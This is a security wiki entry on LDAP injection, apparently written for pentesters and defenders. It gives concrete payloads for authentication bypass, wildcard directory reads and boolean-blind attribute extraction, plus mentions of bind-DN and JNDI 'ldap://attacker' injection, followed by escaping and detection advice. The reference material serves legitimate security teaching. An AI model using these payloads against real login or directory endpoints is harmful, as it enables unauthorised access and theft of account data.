---
title: LDAP injection
slug: ldap-injection
---

> **TL;DR:** Unescaped input goes into an LDAP search filter — bypass authentication, enumerate the directory, and exfiltrate attributes via blind boolean / wildcard probing.

## What it is
Web apps frequently authenticate against LDAP (Active Directory, OpenLDAP, 389DS) by building a search filter like `(&(uid=USER)(userPassword=PASS))`. If `USER` or `PASS` is not escaped per RFC 4515, an attacker can change the structure of the filter — adding clauses, terminating subexpressions, or turning the filter into a wildcard that matches every entry. Blind variants exfiltrate attribute values one byte at a time via response-difference probing.

## Preconditions / where it applies
- A web/auth endpoint that talks LDAP under the hood (corporate SSO, SaaS user lookup, contact directory).
- The LDAP query is built by string concatenation rather than a parameterised library API.
- The result of the query meaningfully changes the HTTP response (auth success/failure, results page populated, attribute echoed).

## Technique
Authentication bypass with classic injection:

```
User: *)(uid=*))(|(uid=*
Pass: anything
```

Resulting filter `(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))` — first sub-expression matches any user, so the bind succeeds for the first match (often `admin`).

Wildcard read on a search endpoint:

```
/search?q=*)(objectClass=*
```

Boolean-blind exfil of an attribute (recover one char of `userPassword`) — most directories store hashes, but cn/mail/title/secretAnswer are common targets:

```
/login?u=admin)(userPassword=a*&p=x   -> 200 if first char is 'a'
/login?u=admin)(userPassword=b*&p=x   -> 401 otherwise
```

Iterate over `a-z0-9` and lengthen the prefix. AD-specific (`memberOf`, `sAMAccountName`) and operational attributes (`pwdLastSet`, `userAccountControl`) are useful for privilege discovery.

Useful payload fragments (escape only when you want literal):

- `*` — wildcard
- `(` `)` — sub-filter delimiters
- `&` `|` `!` — AND, OR, NOT
- `\28` `\29` `\2a` `\5c` `\00` — literal escapes
- `objectClass=*` — match everything

Cousin: **LDAP bind injection** when the username is concatenated into the bind DN — `admin,dc=evil,dc=tld` may attempt to bind to an attacker-controlled DN/server.

JNDI (Java LDAP client) injection extends this — if the LDAP URL is user-controlled, Java pre-Log4j-fix would dereference `ldap://attacker/x` and load remote serialised objects (the original Log4Shell sink).

## Detection and defence
- Use the directory client's parameterised API — `LdapName`, `SearchControls`, or framework-level `LdapTemplate.search(base, filter, args)`.
- Escape user input per RFC 4515 (`\28`, `\29`, `\2a`, `\5c`, `\00`).
- Bind with a low-privilege service account; never bind as the user-supplied DN.
- Limit attributes returned (`attrs` list); strip operational attributes.
- Logging: spikes of distinct prefixes hitting the same auth endpoint, queries with `*` from web tier.

See also [[sql-injection]], [[xpath-injection]], [[deserialisation]].

## References
- [PortSwigger – LDAP injection](https://portswigger.net/web-security/ldap-injection) — primer
- [OWASP – LDAP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html) — escaping rules
- [HackTricks – LDAP injection](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html) — payload reference
